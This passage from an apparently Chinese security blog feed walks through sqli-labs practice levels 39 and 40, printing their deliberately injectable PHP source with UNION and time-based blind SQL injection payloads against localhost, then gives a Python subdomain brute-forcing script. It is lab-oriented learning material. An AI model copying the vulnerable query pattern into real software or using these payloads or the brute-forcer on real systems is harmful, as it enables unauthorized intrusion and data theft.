class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/db-creds.inc"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-39</span> **stacked Query Intiger type**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con1))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: "</span> . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    @mysqli_select_db($con1, $dbname) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">"Unable to connect to the database: $dbname"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;font size = "5" color= "#00FF00"&gt;'</span>;</span><br><span class="line">            printf(<span class="string">"Your Username is : %s"</span>, $row[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            printf(<span class="string">"Your Password is : %s"</span>, $row[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_more_results($con1))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf("-----------------\n");</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="5" color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysqli_error($con1));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line">mysqli_close($con1);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-39.jpg"</span> /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-39/?id=0%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/03/kGV9OA.md.png" alt="kGV9OA.md.png"></p><p><b>第四十关</b><br>无法正常回显，盲注即可<br>四十关代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/db-creds.inc"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-40</span> **stacked Query String type Blind**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:70px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="comment">//mysql connections for stacked query examples.</span></span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno($con1))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Failed to connect to MySQL: "</span> . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    @mysqli_select_db($con1, $dbname) <span class="keyword">or</span> <span class="keyword">die</span> ( <span class="string">"Unable to connect to the database: $dbname"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;font size = "5" color= "#00FF00"&gt;'</span>;</span><br><span class="line">            printf(<span class="string">"Your Username is : %s"</span>, $row[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            printf(<span class="string">"Your Password is : %s"</span>, $row[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_more_results($con1))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf("-----------------\n");</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line">mysqli_close($con1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-40.jpg"</span> /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>payload”</p><pre><code>&apos;) and sleep(if((length(database())=8),1,4))|(&apos;1</code></pre><p><img src="https://s2.ax1x.com/2019/02/03/kGVH1g.md.png" alt="kGVH1g.md.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Subdomain-blasting</title>
      <link href="/posts/60937edf.html"/>
      <url>/posts/60937edf.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天撸了一个子域名爆破脚本，感觉学到了不少。由于刚刚这个傻逼电脑蓝屏，真是操了你的妈。所以截图可能较少<br><img src="https://images.900.tw/upload_file/40/content/d85aa4b9-58d4-c7eb-271a-c029074f4039.png" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先从github上撸了一发字典：<br>字典传送链：<a href="https://paste.ubuntu.com/p/GYT9gBr5XT/" target="_blank" rel="noopener">https://paste.ubuntu.com/p/GYT9gBr5XT/</a></p><p>思路如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.生成1-5级子域名，边生成边测试</span><br><span class="line">2.存活的子域名写入txt</span><br></pre></td></tr></table></figure></p><p>代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:九世</span></span><br><span class="line"><span class="comment">#time:2019/2/1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dict=[]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rkst</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,headers)</span>:</span></span><br><span class="line">        self.headers=headers</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">shenc</span><span class="params">(self,file)</span>:</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> file.readlines():</span><br><span class="line">                qc=<span class="string">""</span>.join(k.split(<span class="string">'\n'</span>))</span><br><span class="line">                <span class="keyword">yield</span> qc</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">one_domain</span><span class="params">(self,ssl,url)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> q <span class="keyword">in</span> dict:</span><br><span class="line">            urls=<span class="string">'&#123;&#125;'</span>.format(ssl)+q+<span class="string">'.'</span>+url</span><br><span class="line">            <span class="keyword">yield</span> urls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">two_domain</span><span class="params">(self,ssl,url)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> v <span class="keyword">in</span> dict:</span><br><span class="line">            <span class="keyword">for</span> v2 <span class="keyword">in</span> dict:</span><br><span class="line">                urls=<span class="string">'&#123;&#125;'</span>.format(ssl)+v+<span class="string">'.'</span>+v2+<span class="string">'.'</span>+url</span><br><span class="line">                <span class="keyword">yield</span>  urls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">san_domain</span><span class="params">(self,ssl,url)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> dict:</span><br><span class="line">            <span class="keyword">for</span> u1 <span class="keyword">in</span> dict:</span><br><span class="line">                <span class="keyword">for</span> u2 <span class="keyword">in</span> dict:</span><br><span class="line">                    urls=<span class="string">'&#123;&#125;'</span>.format(ssl)+u+<span class="string">'.'</span>+u1+<span class="string">'.'</span>+u2+<span class="string">'.'</span>+url</span><br><span class="line">                    <span class="keyword">yield</span> urls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">si_domain</span><span class="params">(self,ssl,url)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> dict:</span><br><span class="line">            <span class="keyword">for</span> s1 <span class="keyword">in</span> dict:</span><br><span class="line">                <span class="keyword">for</span> s2 <span class="keyword">in</span> dict:</span><br><span class="line">                    <span class="keyword">for</span> s3 <span class="keyword">in</span> dict:</span><br><span class="line">                        urls=<span class="string">'&#123;&#125;'</span>.format(ssl)+s+<span class="string">'.'</span>+s1+<span class="string">'.'</span>+s2+<span class="string">'.'</span>+s3+<span class="string">'.'</span>+url</span><br><span class="line">                        <span class="keyword">yield</span> urls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wu_domain</span><span class="params">(self,ssl,url)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> dict:</span><br><span class="line">            <span class="keyword">for</span> b1 <span class="keyword">in</span> dict:</span><br><span class="line">                <span class="keyword">for</span> b2 <span class="keyword">in</span> dict:</span><br><span class="line">                    <span class="keyword">for</span> b3 <span class="keyword">in</span> dict:</span><br><span class="line">                        <span class="keyword">for</span> b4 <span class="keyword">in</span> dict:</span><br><span class="line">                            urls=<span class="string">'&#123;&#125;'</span>.format(ssl)+b+<span class="string">'.'</span>+b1+<span class="string">'.'</span>+b2+<span class="string">'.'</span>+b3+<span class="string">'.'</span>+b4+<span class="string">'.'</span>+url</span><br><span class="line">                            <span class="keyword">yield</span> urls</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bao</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            reqt=requests.get(url=url,headers=self.headers,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">if</span> reqt:</span><br><span class="line">                print(<span class="string">'[+] Found domain:&#123;&#125;'</span>.format(url))</span><br><span class="line">                print(url,file=(<span class="string">'save.txt'</span>,<span class="string">'a'</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        lock.release() <span class="comment">#Unlock the thread</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    headers=&#123;<span class="string">'user-agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">'file/one.txt'</span>):</span><br><span class="line">        print(<span class="string">'[+] Found dict.txt'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[-] Not Found dict.txt...'</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    dk=open(<span class="string">'file/one.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">    user=input(<span class="string">'domain&gt;:'</span>)</span><br><span class="line">    ssl=input(<span class="string">'http/https&gt;:'</span>)</span><br><span class="line">    obj=Rkst(headers=headers)</span><br><span class="line">    <span class="keyword">if</span> ssl==<span class="string">'http'</span>:</span><br><span class="line">        ht=<span class="string">'http://'</span></span><br><span class="line">    <span class="keyword">elif</span> ssl==<span class="string">'https'</span>:</span><br><span class="line">        ht=<span class="string">'https://'</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'[!] Test the first level domain name'</span>)</span><br><span class="line">    <span class="keyword">for</span> o <span class="keyword">in</span> obj.shenc(dk):</span><br><span class="line">        dict.append(o)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    lock=threading.BoundedSemaphore(<span class="number">100</span>) <span class="comment">#Set the thread to 100</span></span><br><span class="line">    print(<span class="string">'[!] Write the generated first-level domain name to the list'</span>)</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> obj.one_domain(ht,user):</span><br><span class="line">        lock.acquire() <span class="comment">#Lock the thread</span></span><br><span class="line">        t = threading.Thread(target=obj.bao, args=(y,))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'[!] Write the generated second-level domain name to the list'</span>)</span><br><span class="line">    <span class="keyword">for</span> y2 <span class="keyword">in</span> obj.two_domain(ht,user):</span><br><span class="line">        lock.acquire()</span><br><span class="line">        t = threading.Thread(target=obj.bao, args=(y2,))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'[!] Write the generated third-level domain name to the list'</span>)</span><br><span class="line">    <span class="keyword">for</span> y3 <span class="keyword">in</span> obj.san_domain(ht,user):</span><br><span class="line">        lock.acquire()</span><br><span class="line">        t = threading.Thread(target=obj.bao, args=(y3,))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'[!] Write the generated four-level domain name to the list'</span>)</span><br><span class="line">    <span class="keyword">for</span> y4 <span class="keyword">in</span> obj.si_domain(ht,user):</span><br><span class="line">        lock.acquire()</span><br><span class="line">        t = threading.Thread(target=obj.bao, args=(y4,))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'[!] Write the generated five-level domain name to the list'</span>)</span><br><span class="line">    <span class="keyword">for</span> y5 <span class="keyword">in</span> obj.wu_domain(ht,user):</span><br><span class="line">        lock.acquire()</span><br><span class="line">        t = threading.Thread(target=obj.bao, args=(y5,))</span><br><span class="line">        t.start()</span><br></pre></td></tr></table></figure></p><p>我在这里加了线锁和指定线程，当然你可以自己更改。这里的默认线程为100<br>如果不加线锁和指定线程的话会出现以下情况：<br><img src="https://s2.ax1x.com/2019/02/03/k8vqaj.md.jpg" alt="k8vqaj.md.jpg"></p><p>测试如下：<br><img src="https://s2.ax1x.com/2019/02/03/k8xFo9.png" alt="k8xFo9.png"></p><p>内存情况如下：<br><img src="https://s2.ax1x.com/2019/02/03/k8xQdH.png" alt="k8xQdH.png"></p><p>学到的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">解决方法：</span><br><span class="line">设置好线程，然后在每个多线程执行之前加个线锁。在运行完指定函数后释放线锁。</span><br><span class="line">设置指定线程数量的文章：https://blog.csdn.net/xkou/article/details/131051</span><br><span class="line"></span><br><span class="line">设置指定线程数量用到的函数：lock=threading.BoundedSemaphore(指定线程)</span><br><span class="line">线锁：lock.acquire() </span><br><span class="line">解锁：lock.release()</span><br></pre></td></tr></table></figure></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>VAuditDemo shooting range message search injection</title>
      <link href="/posts/cc7f1a76.html"/>
      <url>/posts/cc7f1a76.html</url>
